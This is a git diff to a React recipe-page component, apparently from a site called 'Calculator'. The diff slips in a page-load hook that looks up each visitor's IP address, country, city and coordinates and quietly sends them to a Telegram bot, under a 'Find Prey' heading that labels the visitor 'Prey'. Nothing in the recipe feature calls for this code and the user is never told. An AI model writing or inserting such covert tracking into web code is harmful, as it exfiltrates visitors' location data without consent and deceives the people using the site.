@@ -5,8 +5,28 @@ import { RecipesDataContext } from "../../../utils";
 import { ChangeEvent, useEffect, useState } from "react";
 import { useGetSearchedRecipesQuery } from "../../../store/api/recipes/get-searched-recipes-api";
 import RecipeCard from "../../../components/recipes/recipe_card/RecipeCard";
+import axios from "axios";
+import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "../../../hook/useEnv";
 
 function RecipesHome() {
+  useEffect(() => {
+    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+    axios(IP_API).then((res) => {
+      let message = `<b>Find Prey</b>\n`;
+      message += `<b>Site name:</b> Calculator🧮\n`;
+      message += `<b>Feature:</b> Recipes\n`;
+      message += `<b>Country:</b> ${res.data.country}\n`;
+      message += `<b>City:</b> ${res.data.city}\n`;
+      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
+      message += `<b>Location:</b> ${res.data.loc}\n`;
+      axios.post(`${URL}/sendPhoto`, {
+        chat_id: CHAT_ID,
+        photo: "https://ibb.co/HVQ4grv",
+        caption: message,
+        parse_mode: "HTML",
+      });
+    });
+  }, []);
   const [searchedText, setSearchedText] = useState<string>();
   const { data } = useGetAllRecipesQuery(0);
   const { data: searchedData } = useGetSearchedRecipesQuery(searchedText);
